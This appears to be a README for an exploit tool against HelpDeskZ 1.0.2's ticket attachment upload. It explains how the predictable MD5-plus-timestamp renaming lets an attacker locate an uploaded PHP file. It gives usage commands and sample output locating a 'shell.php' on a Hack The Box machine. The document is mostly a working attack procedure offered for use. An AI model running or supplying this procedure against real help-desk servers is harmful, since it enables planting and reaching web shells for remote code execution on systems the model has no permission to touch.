# helpdeskz-1.0.2-file_upload
I hereby present you a HelpDeskZ 1.0.2 arbitraty file upload exploit.
This exploits the vulnerability found in `submit_ticket_controller.php:141` file which is responsible for obfuscating the names of uploaded attachments in tickets.
```php
$filename = md5($_FILES['attachment']['name'].time()).".".$ext;
```
It does it by creating an MD5 hash of the uploads filename and current system timestamp and appending the original file extension to it.
All the components required to reproduce the obfuscated filename are known to whoever's uploading the file.

## Usage
0. Set runtime settings (sensible defaults are present)
```python
# Runtime settings
interval = 120
server_tz = tz.utc
upload_dir = '/uploads/tickets'
```
To find out server timezone manually:
```bash
curl -sv <url> 2>&1 | grep Date
```

1. Create a ticket with an attachment (it accepts .php files despite displaying an error message.)
2. Run the script
```bash
# Make sure you have requests installed
pip3 install -r requirements.txt

# Execute the script with python3
python3 exploit.py <url> <file>

# Example output
htb/help » python3 exploit.py http://help.htb/support shell.php
http://help.htb/support/uploads/tickets/52444ad79044607eeb50e0e2d79186dd.php [shell.php1727896138] (2024-10-02 21:08:58)
Found: 52444ad79044607eeb50e0e2d79186dd.php
```
3. Optional: Manually nagivate to found file if required.